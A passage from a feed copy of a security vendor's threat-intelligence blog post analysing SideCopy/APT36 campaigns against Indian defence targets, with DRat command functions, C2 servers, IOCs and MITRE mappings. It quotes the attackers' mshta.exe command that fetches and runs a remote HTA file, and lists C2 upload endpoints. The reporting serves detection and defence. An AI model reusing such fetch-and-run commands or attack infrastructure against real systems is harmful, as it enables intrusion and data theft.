/></p>\n<p style=\"text-align: center;\"><i>Fig. 10 – Infection chain-2 with IP sharing with domains and C2</i></p>\n<p>Correlation</p>\n<ul>\n<li>A similar attack chain of SideCopy is observed with the lure document “<i>DocScanner-Oct</i>” referring to the Ministry of Defences’ Saudi Delegation. The same decoy was observed to be used by SideCopy &amp; APT36 earlier in an April &amp; May campaign, respectively.</li>\n<li>The compromised domain in this chain, ‘<i>rockwellroyalhomes[.]com</i>’ is resolving to the same IP <b>103.76.213[.]95</b> used with the domain ‘<i>isometricsindia[.]co.in,</i>’ which was observed to be used by them in an August campaign utilizing the theme: “US vs. China trade war.”</li>\n<li>The final payload DRat connects with the IP <b>38.242.149[.]89</b> for C2 communication used with AllaKore RAT.</li>\n<li>A similar phishing URL is found on the same “<i>rockwellroyalhomes</i>” domain, named similarly “<i>DocScanner_AUG_2023.zip.</i>” This leads to another Ares RAT sample, connecting to C2 having IP <b>38.242.220[.]166:9012, </b>where the decoy points to India’s Ministry of Defense again regarding the “<i>Parliament Matter.</i>”</li>\n</ul>\n<p style=\"text-align: center;\"><i><img class=\"alignnone wp-image-5884\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/11/Screenshot-2023-10-27-172147-300x197.png\" alt=\"\" width=\"688\" height=\"452\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/11/Screenshot-2023-10-27-172147-300x197.png 300w, https://www.seqrite.com/blog/wp-content/uploads/2023/11/Screenshot-2023-10-27-172147-768x505.png 768w, https://www.seqrite.com/blog/wp-content/uploads/2023/11/Screenshot-2023-10-27-172147-1024x673.png 1024w, https://www.seqrite.com/blog/wp-content/uploads/2023/11/Screenshot-2023-10-27-172147.png 1351w\" sizes=\"(max-width: 688px) 100vw, 688px\" /></i></p>\n<p style=\"text-align: center;\"><i>Fig. 8 – Decoy used with Ares RAT</i></p>\n<p>The phishing URL is pointing to <i>rockwellroyalhomes[.]com</i>, a compromised domain that is resolving to the IP: <i>103.76.231[.]95</i></p>\n<table style=\"font-weight: 400;\">\n<tbody>\n<tr>\n<td></td>\n<td>hxxps://www.rockwellroyalhomes.com/js/FL/DocScanner-Oct.zip</td>\n</tr>\n</tbody>\n</table>\n<p>This contains a malicious shortcut file in a double extension format named “DocScanner-Oct.zip․pdf.lnk,” that triggers a remote HTA file as:</p>\n<table style=\"font-weight: 400;\">\n<tbody>\n<tr>\n<td></td>\n<td>C:\\Windows\\System32\\mshta.exe hxxps://www.rockwellroyalhomes.com/js/content/ &amp; mshta.exe</td>\n</tr>\n</tbody>\n</table>\n<p>It contains embedded files that are base64 encoded; they are decoy PDF, DLL, and EXE. Similar checks for anti-virus present on the victim machine is done, opens the decoy and drops the final <b><i>DRat</i></b> payload, a new Remote Access Trojan named from the PDB path:</p>\n<table style=\"font-weight: 400;\">\n<tbody>\n<tr>\n<td></td>\n<td>d:\\Projects\\C#\\D-Rat\\DRat Client\\Tenure\\obj\\Release\\MSEclipse.pdb</td>\n</tr>\n</tbody>\n</table>\n<p>The 13 commands supported have the following functionality:</p>\n<table>\n<tbody>\n<tr>\n<td><b><i>Decoded Command</i></b></td>\n<td><b><i>Functionality</i></b></td>\n</tr>\n<tr>\n<td>getInformitica</td>\n<td>Send system info – User &amp; OS name, timestamp, Start-up path</td>\n</tr>\n<tr>\n<td>sup</td>\n<td>Send a ‘<i>supconfirm</i>’ message to start receiving commands</td>\n</tr>\n<tr>\n<td>close</td>\n<td>Send a ‘<i>closure</i>’ message to close the connection and exit</td>\n</tr>\n<tr>\n<td>Kaamindina</td>\n<td>Check running status</td>\n</tr>\n<tr>\n<td>del</td>\n<td>Delete specific directory (or) file and send confirmation</td>\n</tr>\n<tr>\n<td>enterPath</td>\n<td>Enter a specific directory and send attributes for each file &amp; sub-folder</td>\n</tr>\n<tr>\n<td>backPath</td>\n<td>Send the current working directory</td>\n</tr>\n<tr>\n<td>driveList</td>\n<td>Fetch disk info and DeviceID using:</p>\n<ul>\n<li>‘SELECT * FROM Win32_LogicalDisk WHERE DriveType = 3’</li>\n</ul>\n</td>\n</tr>\n<tr>\n<td>fdl</td>\n<td>Upload file attributes</td>\n</tr>\n<tr>\n<td>fdIConfirm</td>\n<td>Upload file</td>\n</tr>\n<tr>\n<td>fup</td>\n<td>Download file</td>\n</tr>\n<tr>\n<td>fupexec</td>\n<td>Download and execute (1)</td>\n</tr>\n<tr>\n<td>supexec</td>\n<td>Download and execute (2)</td>\n</tr>\n</tbody>\n</table>\n<p><img class=\" wp-image-5875 aligncenter\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/11/Screenshot-2023-10-26-185121-283x300.png\" alt=\"\" width=\"454\" height=\"481\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/11/Screenshot-2023-10-26-185121-283x300.png 283w, https://www.seqrite.com/blog/wp-content/uploads/2023/11/Screenshot-2023-10-26-185121-768x815.png 768w, https://www.seqrite.com/blog/wp-content/uploads/2023/11/Screenshot-2023-10-26-185121.png 901w\" sizes=\"(max-width: 454px) 100vw, 454px\" /></p>\n<p style=\"text-align: center;\"><i>Fig. 8 – Reuse of decoy with DRat</i></p>\n<p>Another campaign has been found with similar targeting of Windows and Linux platforms simultaneously. A new payload for Windows, named Key RAT, is deployed in this case along Ares RAT. IOCs for this third campaign have been included at the end.</p>\n<h2><b>C2 Infrastructure and Domains</b></h2>\n<p>All the C2 servers are registered in Germany to Contabo GmbH, commonly used by both the Pakistan-linked APTs.</p>\n<table>\n<tbody>\n<tr>\n<td>38.242.149[.]89</td>\n<td>vmi1433024.contaboserver.net</td>\n<td>AllaKore RAT and DRat</td>\n</tr>\n<tr>\n<td>207.180.192[.]77</td>\n<td>vmi747785.contaboserver.net</td>\n<td>Key RAT</td>\n</tr>\n<tr>\n<td>38.242.220[.]166</td>\n<td>vmi1390334.contaboserver.net</td>\n<td>Ares RAT</td>\n</tr>\n<tr>\n<td>161.97.151[.]220</td>\n<td>vmi1370228.contaboserver.net</td>\n<td>Ares RAT</td>\n</tr>\n</tbody>\n</table>\n<p>One server of Ares that is linked with multiple baits, is running pfsense firewall on port 9012 for C2 communication – <i>38.242.220[.]166</i>.</p>\n<p><img class=\" wp-image-5880 aligncenter\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/11/Ares_c2-300x83.png\" alt=\"\" width=\"445\" height=\"123\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/11/Ares_c2-300x83.png 300w, https://www.seqrite.com/blog/wp-content/uploads/2023/11/Ares_c2.png 504w\" sizes=\"(max-width: 445px) 100vw, 445px\" /></p>\n<p style=\"text-align: center;\"><i>Fig. 9 – Ares server details</i></p>\n<p><img class=\" wp-image-5882 aligncenter\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/11/c2_pfsense-300x137.png\" alt=\"\" width=\"582\" height=\"266\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/11/c2_pfsense-300x137.png 300w, https://www.seqrite.com/blog/wp-content/uploads/2023/11/c2_pfsense-768x352.png 768w, https://www.seqrite.com/blog/wp-content/uploads/2023/11/c2_pfsense-1024x469.png 1024w, https://www.seqrite.com/blog/wp-content/uploads/2023/11/c2_pfsense.png 1600w\" sizes=\"(max-width: 582px) 100vw, 582px\" /></p>\n<p style=\"text-align: center;\"><i>Fig. 10 – pfsense login page of Ares server</i></p>\n<p>All the compromised domains used by SideCopy this year, have <i>GoDaddy</i> as registrar with <i>HostGator</i> server name. Whois details are:</p>\n<table>\n<tbody>\n<tr>\n<td><b>IP</b></td>\n<td><b>Domain</b></td>\n<td><b>Campaign</b></td>\n<td><b>Registrant</b></td>\n</tr>\n<tr>\n<td colspan=\"1\" rowspan=\"2\"><b>103.76.213[.]95</b></p>\n<p>&nbsp;</p>\n<p>Org: Spectra Technologies</p>\n<p>ISP: CtrlS</p>\n<p>Delhi, India &#8211; AS18229</td>\n<td>isometricsindia[.]co.in</td>\n<td>August</td>\n<td>Ozanera Pvt. Ltd., Mumbai</td>\n</tr>\n<tr>\n<td>rockwellroyalhomes[.]com</td>\n<td>October</td>\n<td>Tempe, Arizona, US</td>\n</tr>\n<tr>\n<td colspan=\"1\" rowspan=\"4\"><b>162.241.85[.]104</b></p>\n<p>&nbsp;</p>\n<p>Org &amp; ISP: Unified Layer</p>\n<p>Provo, Utah, US &#8211; AS46606</td>\n<td>sunfireglobal[.]in</td>\n<td>October</td>\n<td>West Bengal, India</td>\n</tr>\n<tr>\n<td>occoman[.]com</td>\n<td>August</td>\n<td>Tempe, Arizona, US</td>\n</tr>\n<tr>\n<td>elfinindia[.]com</td>\n<td>May</td>\n<td>Tempe, Arizona, US</td>\n</tr>\n<tr>\n<td>ssynergy[.]in</td>\n<td>April</td>\n<td>West Bengal, India</td>\n</tr>\n</tbody>\n</table>\n<p>We have seen the machine name ‘<i>desktop-g4b6mh4</i>’ associated with a huge number of shortcut files this year. It is not only observed in these campaigns, but new ones have been used by the threat actor:</p>\n<ul>\n<li>desktop-87p7en5</li>\n<li>desktop-ey8nc5b</li>\n</ul>\n<h2><b>Conclusion &amp; Attribution</b></h2>\n<p>Expanding its arsenal with zero-day vulnerability, SideCopy consistently targets Indian defense organizations with various remote access trojans. Based on the attack chain, selection of target, baits used and infrastructure; these campaigns are attributed to SideCopy with high confidence. APT36 is expanding its Linux arsenal constantly, where sharing its Linux stagers with SideCopy is observed to deploy an open-source Python RAT called Ares. At the same time, we have observed telemetry hits for this campaign in multiple Indian cities, showing an uptick in activity amidst the Israel-Hamas conflict. Overall, both these and additional campaigns have connections to the sharing of code and infrastructure between these closely related threat groups.</p>\n<h2><b>SEQRITE Protection</b></h2>\n<table>\n<tbody>\n<tr>\n<td>LNK.Trojan.48283.GC</td>\n<td>SideCopy.Trojan.48284.GC</td>\n<td>JS.Trojan.47685</td>\n</tr>\n<tr>\n<td>LNK.Dropper.47686.GC</td>\n<td>SideCopy.Trojan.48285.GC</td>\n<td>JS.Sidecopy.47539.GC</td>\n</tr>\n<tr>\n<td>LNK.Sidecopy.47538.GC</td>\n<td>Trojan.SideCopy.S30112863</td>\n<td>JS.Sidecopy.47540</td>\n</tr>\n<tr>\n<td>ELF.Agent.48298.GC</td>\n<td>Trojan.SideCopy.S30112905</td>\n<td>JS.SideCopy.42911</td>\n</tr>\n<tr>\n<td>ELF.Agent.48286.GC</td>\n<td>Trojan.Sidecopy.S30112904</td>\n<td>Trojan.SideCopy</td>\n</tr>\n<tr>\n<td>Script.Trojan.47763</td>\n<td>TrojanAPT.SideCopy.PB1</td>\n<td></td>\n</tr>\n</tbody>\n</table>\n<h2><b>Precautions to be taken</b></h2>\n<p>It is necessary to stay protected from such critical cyber-attacks by taking the following precautions:</p>\n<ul>\n<li>Avoid clicking on any unverified links from unknown sources.</li>\n<li>Do not download and open any attachments, especially archive files.</li>\n<li>Use endpoint protection to stay ahead in the ongoing threat landscape.</li>\n<li>Regularly update your OS and software apps to fix known vulnerabilities.</li>\n<li>Add password-protection to confidential documents and sensitive information.</li>\n</ul>\n<h2><b>IOCs</b></h2>\n<h3><b>Windows</b></h3>\n<table>\n<tbody>\n<tr>\n<td colspan=\"2\" rowspan=\"1\"><b>Archives</b></td>\n</tr>\n<tr>\n<td>eb07a0063132e33c66d0984266afb8ae</td>\n<td>DocScanner-Oct.zip</td>\n</tr>\n<tr>\n<td>8bee417262cf81bc45646da357541036</td>\n<td>Homosexuality &#8211; Indian Armed Forces.zip</td>\n</tr>\n<tr>\n<td>9e9f93304c8d77c9473de475545bbc23</td>\n<td>Achievements_of_DMA.rar</td>\n</tr>\n<tr>\n<td>9379ebf1a732bfb1f4f8915dbb82ca56</td>\n<td>Agenda_Points_Ammended.rar</td>\n</tr>\n<tr>\n<td>49b29596c81892f8fff321ff8d64105a</td>\n<td>DMA_Monthly_Update_Minutes_of_Meeting-reg.zip</td>\n</tr>\n<tr>\n<td colspan=\"2\" rowspan=\"1\"><b>Shortcut (LNK)</b></td>\n</tr>\n<tr>\n<td>75f9d86638c8634620f02370c28b8ebd</td>\n<td>DocScanner-Oct.pdf.lnk</td>\n</tr>\n<tr>\n<td>fc5eae3562c9dbf215384ddaf0ce3b03</td>\n<td>Homosexuality &#8211; Indian Armed Forces. pdf.lnk</td>\n</tr>\n<tr>\n<td>a52d2a0edccdc0f533c7b04e88fe8092</td>\n<td>agenda_points.docx.lnk</p>\n<p>draft_short_PPT.pptx.lnk</p>\n<p>meeting_brief.pdf.lnk</td>\n</tr>\n<tr>\n<td colspan=\"2\" rowspan=\"1\"><b>HTA</b></td>\n</tr>\n<tr>\n<td>02c444c5c1ad25e6823457705e8820bc</td>\n<td>msfnt.hta</td>\n</tr>\n<tr>\n<td>d6e214fd81e7afb57ea77b79f8ff1d45</td>\n<td>p.hta</td>\n</tr>\n<tr>\n<td>d0c80705be2bc778c7030aae1087f96e</td>\n<td>main.hta</td>\n</tr>\n<tr>\n<td colspan=\"2\" rowspan=\"1\"><b>DLL</b></td>\n</tr>\n<tr>\n<td>31340EA400E6611486D5E57F0FAB5AF2</td>\n<td>SummitOfBion.dll</td>\n</tr>\n<tr>\n<td>FE0250AF25C625E24608D8594B716ECB</td>\n<td>preBotHta.dll</td>\n</tr>\n<tr>\n<td>C872F21B06C4613954FFC0676C1092E3</td>\n<td>WinGfx.dll</td>\n</tr>\n<tr>\n<td colspan=\"2\" rowspan=\"1\"><b>RAT</b></td>\n</tr>\n<tr>\n<td>ff13b07eaabf984900e88657f5d193e6</td>\n<td>Msfront.exe (DRat)</td>\n</tr>\n<tr>\n<td>6f37dacf81af574f1c8a310c592df63f</td>\n<td>Achievements_of_DMA.pdf .exe (AllaKore RAT)</td>\n</tr>\n<tr>\n<td>9f5354dcf6e6b5acd4213d9ff77ce07c</td>\n<td>steistem.exe / Onlyme.exe (Key RAT)</td>\n</tr>\n<tr>\n<td colspan=\"2\" rowspan=\"1\"><b>Decoys</b></td>\n</tr>\n<tr>\n<td>CCB6723C14EBB0A12395668377CF3F7A</td>\n<td>DocScanner-Oct.pdf</td>\n</tr>\n<tr>\n<td>acec2107d4839fbb04defbe376ac4973</td>\n<td>Achievements_of_DMA.pdf_</td>\n</tr>\n<tr>\n<td>f759b6581367db35e3978125f4f6ff80</td>\n<td>ACR.pdf</td>\n</tr>\n<tr>\n<td colspan=\"2\" rowspan=\"1\"><b>Others</b></td>\n</tr>\n<tr>\n<td>B6FBCAE7980D4E02CE9ED9876717F385</td>\n<td>cache.bat</td>\n</tr>\n<tr>\n<td>4f541ec8cd238737e4e77a55fbcbb4f3</td>\n<td>d.txt</td>\n</tr>\n<tr>\n<td colspan=\"2\" rowspan=\"1\"><b>PDB</b></td>\n</tr>\n<tr>\n<td colspan=\"2\" rowspan=\"1\">d:\\Projects\\C#\\D-Rat\\DRat Client\\Tenure\\obj\\Release\\MSEclipse.pdb</td>\n</tr>\n<tr>\n<td colspan=\"2\" rowspan=\"1\">C:\\Users\\Boss\\Desktop\\test\\Client\\Client\\obj\\Release\\Onlyme.pdb</td>\n</tr>\n</tbody>\n</table>\n<h3><b>Linux</b></h3>\n<table>\n<tbody>\n<tr>\n<td colspan=\"2\" rowspan=\"1\"><b>Archive</b></td>\n</tr>\n<tr>\n<td>7cba23cfd9587211e7a214a88589cf25</td>\n<td>DocScanner_AUG_2023.zip</td>\n</tr>\n<tr>\n<td>04a65069054085cd81daabe4fc15ce76</td>\n<td>Homosexuality &#8211; Indian Armed Forces.zip</td>\n</tr>\n<tr>\n<td>c61b19cbedcb878aff45c067d503d556</td>\n<td>meeting-details.zip</td>\n</tr>\n<tr>\n<td>eccc72deb8ce41433ed13591b4557343</td>\n<td>DMA_Monthly_Update_Minutes_of_Meeting-reg.zip</td>\n</tr>\n<tr>\n<td colspan=\"2\" rowspan=\"1\"><b>Stager</b></td>\n</tr>\n<tr>\n<td>9375e3c13c85990822d2f09a66b551d9</td>\n<td>DocScanner_AUG_2023.pdf</td>\n</tr>\n<tr>\n<td>42a696ef6f7acf0919fea9748029a966</td>\n<td>Homosexuality &#8211; Indian Armed Forces ․pdf</td>\n</tr>\n<tr>\n<td>54473E0D8CAFD950AFE32DE1A2F3A508</td>\n<td>DocScanner_Updated_letter․pdf</td>\n</tr>\n<tr>\n<td>36933B05B7E3060955E6A1FDFD7D8EC1</td>\n<td>draft_letter_nov_2023․docx</td>\n</tr>\n<tr>\n<td>508F4BFAD9F2482992AC7926910BD551</td>\n<td>updated_draft_PPT․pptx</td>\n</tr>\n<tr>\n<td>921915ecfe17593476648ad20cd61ecd</td>\n<td>Meeting_Notice-reg․pdf</td>\n</tr>\n<tr>\n<td colspan=\"2\" rowspan=\"1\"><b>Decoys</b></td>\n</tr>\n<tr>\n<td>5e32703e3704b2b5c299c242713b1ec5</td>\n<td>DocScanner_AUG_2023.pdf</td>\n</tr>\n<tr>\n<td>f759b6581367db35e3978125f4f6ff80</td>\n<td>ACR.pdf</td>\n</tr>\n<tr>\n<td>af3ec4f8a072779eb0cac18eaafc256d</td>\n<td>Meeting_Notice-reg.pdf</td>\n</tr>\n<tr>\n<td>0799e17933b875e3a54f01416e7505d5</td>\n<td>DocScanner_Updated_letter.pdf</td>\n</tr>\n<tr>\n<td>b4854c420bc39c8c77a0fcd9395a8748</td>\n<td>draft_letter_nov_2023.docx</td>\n</tr>\n<tr>\n<td>4cd0ee8186dc4203aad0cba48a8e5778</td>\n<td>updated_draft_PPT.pptx</td>\n</tr>\n<tr>\n<td colspan=\"2\" rowspan=\"1\"><b>Ares RAT</b></td>\n</tr>\n<tr>\n<td>088b89698b122454666e542b1e1d92a4</td>\n<td>bossupdate</td>\n</tr>\n<tr>\n<td>b992b03b0942658a516439b56afbf41a</td>\n<td>updates</td>\n</tr>\n<tr>\n<td>ebbc1c4fc617cda7a0b341b12f45d2ad</td>\n<td>updates</td>\n</tr>\n</tbody>\n</table>\n<h3><b>C2 and Domains</b></h3>\n<table>\n<tbody>\n<tr>\n<td>38.242.149[.]89:61101</td>\n<td>AllaKore RAT</td>\n</tr>\n<tr>\n<td>38.242.149[.]89:9828</td>\n<td>DRat</td>\n</tr>\n<tr>\n<td>38.242.220[.]166:9012</p>\n<p>161.97.151[.]220:7015</td>\n<td>Ares RAT</td>\n</tr>\n<tr>\n<td>207.180.192[.]77:6023</td>\n<td>Key RAT</td>\n</tr>\n<tr>\n<td>162.241.85[.]104</td>\n<td>sunfireglobal[.]in</p>\n<p>occoman[.]com</p>\n<p>elfinindia[.]com</p>\n<p>ssynergy[.]in</td>\n</tr>\n<tr>\n<td>103.76.213[.]95</td>\n<td>rockwellroyalhomes[.]com</p>\n<p>isometricsindia[.]co.in</td>\n</tr>\n</tbody>\n</table>\n<h3><b>URLs</b></h3>\n<table>\n<tbody>\n<tr>\n<td>hxxps://www.rockwellroyalhomes[.]com/js/FL/DocScanner-Oct.zip</td>\n</tr>\n<tr>\n<td>hxxps://www.rockwellroyalhomes[.]com/js/content/msfnt.hta</td>\n</tr>\n<tr>\n<td>hxxps://www.rockwellroyalhomes[.]com/js/content/2023-06-21-0056.pdf</td>\n</tr>\n<tr>\n<td>hxxps://www.rockwellroyalhomes[.]com/js/content/</td>\n</tr>\n<tr>\n<td>hxxps://www.rockwellroyalhomes[.]com/js/FL/2023-06-21-0056.pdf</td>\n</tr>\n<tr>\n<td>hxxps://www.rockwellroyalhomes[.]com/crm/asset/css/files/file/</td>\n</tr>\n<tr>\n<td>hxxps://www.rockwellroyalhomes[.]com/crm/asset/css/files/doc/</td>\n</tr>\n<tr>\n<td>hxxps://www.rockwellroyalhomes[.]com/crm/asset/css/files/doc/DocScanner_AUG_2023.zip</td>\n</tr>\n<tr>\n<td>hxxps://sunfireglobal[.]in/public/core/homo/</td>\n</tr>\n<tr>\n<td>hxxps://sunfireglobal[.]in/public/assests/files/db/acr/</td>\n</tr>\n<tr>\n<td>hxxps://sunfireglobal[.]in/public/assests/files/auth/av</td>\n</tr>\n<tr>\n<td>hxxps://sunfireglobal[.]in/public/assests/files/auth/dl</td>\n</tr>\n<tr>\n<td>hxxps://sunfireglobal[.]in/public/assests/files/auth/ht</td>\n</tr>\n<tr>\n<td>hxxps://occoman[.]com/wp-admin/css/colors/ocean/files/files/tls</td>\n</tr>\n<tr>\n<td>hxxps://occoman[.]com/wp-admin/css/colors/ocean/files/files/</td>\n</tr>\n<tr>\n<td>hxxps://occoman[.]com/wp-admin/css/colors/ocean/files/pdf/in</td>\n</tr>\n<tr>\n<td>hxxps://occoman[.]com/wp-admin/css/colors/ocean/files/files/bossupdate</td>\n</tr>\n<tr>\n<td>hxxps://futureuniform[.]ca/wp/wp-content/files/01/main.hta</td>\n</tr>\n<tr>\n<td>hxxps://futureuniform[.]ca/email.gov.in/briefcase/Meeting_Notice-reg.pdf</td>\n</tr>\n<tr>\n<td>hxxps://futureuniform[.]ca/mail.gov.in/briefcase/updated_draft_PPT.pptx</td>\n</tr>\n<tr>\n<td>hxxps://futureuniform[.]ca/mail.gov.in/briefcase/draft_letter_nov_2023.docx</td>\n</tr>\n<tr>\n<td>hxxps://futureuniform[.]ca/mail.gov.in/briefcase/DocScanner_Updated_letter.pdf</td>\n</tr>\n<tr>\n<td>hxxps://keziaschool[.]com/wp/wp-content/uploads/2023/files/bossupdate</td>\n</tr>\n<tr>\n<td>hxxps://keziaschool[.]com/wp/wp-content/uploads/2023/38</td>\n</tr>\n<tr>\n<td>hxxp://38.242.220[.]166:9012/api/root_149371139681480/upload</td>\n</tr>\n<tr>\n<td>hxxp://38.242.220[.]166:9012/api/root_149371139681480/hello</td>\n</tr>\n<tr>\n<td>hxxp://38.242.220[.]166:9012/api/root_168683512566649/upload</td>\n</tr>\n<tr>\n<td>hxxp://38.242.220[.]166:9012/api/root_168683512566649/hello</td>\n</tr>\n<tr>\n<td>hxxp://38.242.220[.]166:9012/api/root_175170531258512/upload</td>\n</tr>\n<tr>\n<td>hxxp://38.242.220[.]166:9012/api/root_175170531258512/hello</td>\n</tr>\n<tr>\n<td>hxxp://161.97.151[.]220:7015/api/root_36854582802642/upload</td>\n</tr>\n<tr>\n<td>hxxp://161.97.151[.]220:7015/api/root_36854582802642/hello</td>\n</tr>\n</tbody>\n</table>\n<h3><b>Host</b></h3>\n<table>\n<tbody>\n<tr>\n<td>C:\\Users\\Public\\aque\\up.hta</td>\n</tr>\n<tr>\n<td>C:\\Users\\Public\\aque\\cdrzip.exe</td>\n</tr>\n<tr>\n<td>C:\\Users\\Public\\aque\\rekeywiz.exe</td>\n</tr>\n<tr>\n<td>C:\\Users\\Public\\aque\\DUser.dll</td>\n</tr>\n<tr>\n<td>C:\\Users\\Public\\aque\\data.bat</td>\n</tr>\n<tr>\n<td>C:\\Users\\Public\\Msfront\\Msfront.exe</td>\n</tr>\n<tr>\n<td>C:\\Users\\Public\\winowimg.jpg</td>\n</tr>\n<tr>\n<td>C:\\Users\\Public\\stremoe\\steistem.exe</td>\n</tr>\n<tr>\n<td>C:\\Users\\Public\\stremoe\\stremoe.bat</td>\n</tr>\n<tr>\n<td>C:\\ProgramData\\Intel\\cdrzip.exe</td>\n</tr>\n<tr>\n<td>C:\\ProgramData\\Intel\\DUser.dll</td>\n</tr>\n<tr>\n<td>C:\\ProgramData\\WinGfx\\credwiz.exe</td>\n</tr>\n<tr>\n<td>C:\\ProgramData\\WinGfx\\wingfx.bat</td>\n</tr>\n<tr>\n<td>C:\\ProgramData\\WinGfx\\DUser.dll</td>\n</tr>\n<tr>\n<td>C:\\ProgramData\\HP\\jquery.hta</td>\n</tr>\n<tr>\n<td>C:\\ProgramData\\HP\\jscy.hta</td>\n</tr>\n<tr>\n<td>%AppData%\\Msfront\\Msfront.exe</td>\n</tr>\n<tr>\n<td>%AppData%\\Msfront\\DUser.dll</td>\n</tr>\n<tr>\n<td>%AppData%\\Msfront\\crezly.exe</td>\n</tr>\n<tr>\n<td>%Temp%\\cache.bat</td>\n</tr>\n<tr>\n<td>%Temp%\\Msfont\\Msfont.exe</td>\n</tr>\n</tbody>\n</table>\n<h2><b>MITRE ATT&amp;CK</b></h2>\n<table>\n<tbody>\n<tr>\n<td><b>Tactic</b></td>\n<td><b>Technique ID</b></td>\n<td><b>Name</b></td>\n</tr>\n<tr>\n<td>Resource Development</td>\n<td>T1583.001</p>\n<p>T1584.001</p>\n<p>T1588.001</p>\n<p>T1588.002</p>\n<p>T1608.001</p>\n<p>T1608.005</td>\n<td>Acquire Infrastructure: Domains</p>\n<p>Compromise Infrastructure: Domains</p>\n<p>Obtain Capabilities: Malware</p>\n<p>Obtain Capabilities: Tool</p>\n<p>Stage Capabilities: Upload Malware</p>\n<p>Stage Capabilities: Link Target</td>\n</tr>\n<tr>\n<td>Initial Access</td>\n<td>T1566.001</p>\n<p>T1566.002</td>\n<td>Phishing: Spear phishing Attachment</p>\n<p>Phishing: Spear phishing Link</td>\n</tr>\n<tr>\n<td>Execution</td>\n<td>T1106</p>\n<p>T1129</p>\n<p>T1059</p>\n<p>T1047</p>\n<p>T1203</p>\n<p>T1204.001</p>\n<p>T1204.002</td>\n<td>Native API</p>\n<p>Shared Modules</p>\n<p>Command and Scripting Interpreter</p>\n<p>Windows Management Instrumentation</p>\n<p>Exploitation for Client Execution</p>\n<p>User Execution: Malicious Link</p>\n<p>User Execution: Malicious File</td>\n</tr>\n<tr>\n<td>Persistence</td>\n<td>T1053.003</p>\n<p>T1547.001</p>\n<p>T1547.013</td>\n<td>Scheduled Task/Job: Cron</p>\n<p>Registry Run Keys / Startup Folder</p>\n<p>Boot or Logon Autostart Execution: XDG Autostart Entries</td>\n</tr>\n<tr>\n<td>Defense Evasion</td>\n<td>T1036.005</p>\n<p>T1140</p>\n<p>T1218.005</p>\n<p>T1574.002</p>\n<p>T1222.002</p>\n<p>T1027.009</p>\n<p>T1027.010</td>\n<td>Masquerading: Match Legitimate Name or Location</p>\n<p>Deobfuscate/Decode Files or Information</p>\n<p>System Binary Proxy Execution: Mshta</p>\n<p>Hijack Execution Flow: DLL Side-Loading</p>\n<p>File and Directory Permissions Modification: Linux</p>\n<p>Obfuscated Files or Information: Embedded Payloads</p>\n<p>Obfuscated Files or Information: Command Obfuscation</td>\n</tr>\n<tr>\n<td>Discovery</td>\n<td>T1012</p>\n<p>T1033</p>\n<p>T1057</p>\n<p>T1082</p>\n<p>T1083</p>\n<p>T1016.001</p>\n<p>T1518.001</td>\n<td>Query Registry</p>\n<p>System Owner/User Discovery</p>\n<p>Process Discovery</p>\n<p>System Information Discovery</p>\n<p>File and Directory Discovery</p>\n<p>System Network Configuration Discovery</p>\n<p>Software Discovery: Security Software Discovery</td>\n</tr>\n<tr>\n<td>Collection</td>\n<td>T1005</p>\n<p>T1056.001</p>\n<p>T1074.001</p>\n<p>T1119</p>\n<p>T1113</p>\n<p>T1125</td>\n<td>Data from Local System</p>\n<p>Input Capture: Keylogging</p>\n<p>Data Staged: Local Data Staging</p>\n<p>Automated Collection</p>\n<p>Screen Capture</p>\n<p>Video Capture</td>\n</tr>\n<tr>\n<td>Command and Control</td>\n<td>T1105</p>\n<p>T1571</p>\n<p>T1573</p>\n<p>T1071.001</td>\n<td>Ingress Tool Transfer</p>\n<p>Non-Standard Port</p>\n<p>Encrypted Channel</p>\n<p>Application Layer Protocol: Web Protocols</td>\n</tr>\n<tr>\n<td>Exfiltration</td>\n<td>T1041</td>\n<td>Exfiltration Over C2 Channel</td>\n</tr>\n</tbody>\n</table>\n<p>&nbsp;</p>\n<p>The post <a rel=\"follow\" href=\"https://www.seqrite.com/blog/sidecopys-multi-platform-onslaught-leveraging-winrar-zero-day-and-linux-variant-of-ares-rat/\" data-wpel-link=\"internal\" target=\"_self\">SideCopy’s Multi-platform Onslaught: Leveraging WinRAR Zero-Day and Linux Variant of Ares RAT</a> appeared first on <a rel=\"follow\" href=\"https://www.seqrite.com/blog\" data-wpel-link=\"internal\" target=\"_self\">Blogs on Information Technology, Network &amp; Cybersecurity | Seqrite</a>.</p>\n"},"wfw:commentRss":"https://www.seqrite.com/blog/sidecopys-multi-platform-onslaught-leveraging-winrar-zero-day-and-linux-variant-of-ares-rat/feed/","slash:comments":"0","commentcount":"0"},{"title":"MedusaLocker Ransomware: An In-Depth Technical Analysis and Prevention Strategies","link":"https://www.seqrite.com/blog/medusalocker-ransomware-an-in-depth-technical-analysis-and-prevention-strategies/","comments":"https://www.seqrite.com/blog/medusalocker-ransomware-an-in-depth-technical-analysis-and-prevention-strategies/#respond","pubDate":"Mon, 16 Oct 2023 12:19:27 +0000","dc:creator":{"#cdata-section":"Soumen Burma"},"author":"Soumen Burma","category":{"#cdata-section":"Uncategorized"},"guid":{"@isPermaLink":"false","#text":"https://www.seqrite.com/blog/?p=5846"},"img":"https://www.seqrite.com/blog/wp-content/uploads/2023/10/SEQRITE-Blog-medusalocker-230x168.png","description":{"#cdata-section":"<p>Our recent research has highlighted the presence of the MedusaLocker ransomware, which first surfaced in mid-2019. Its primary targets are the Hospital and Healthcare industries. MedusaLocker employs AES and RSA encryption techniques to encrypt victims&#8217; data. Technical analysis At the start, it performs a check for the presence of a Mutex. If the Mutex does [&#8230;]</p>\n<p>The post <a rel=\"follow\" href=\"https://www.seqrite.com/blog/medusalocker-ransomware-an-in-depth-technical-analysis-and-prevention-strategies/\" data-wpel-link=\"internal\" target=\"_self\">MedusaLocker Ransomware: An In-Depth Technical Analysis and Prevention Strategies</a> appeared first on <a rel=\"follow\" href=\"https://www.seqrite.com/blog\" data-wpel-link=\"internal\" target=\"_self\">Blogs on Information Technology, Network &amp; Cybersecurity | Seqrite</a>.</p>\n"},"content:encoded":{"#cdata-section":"<span class=\"rt-reading-time\" style=\"display: block;\"><span class=\"rt-label\">Estimated reading time: </span><span class=\"rt-time\">5</span><span class=\"rt-label\"> 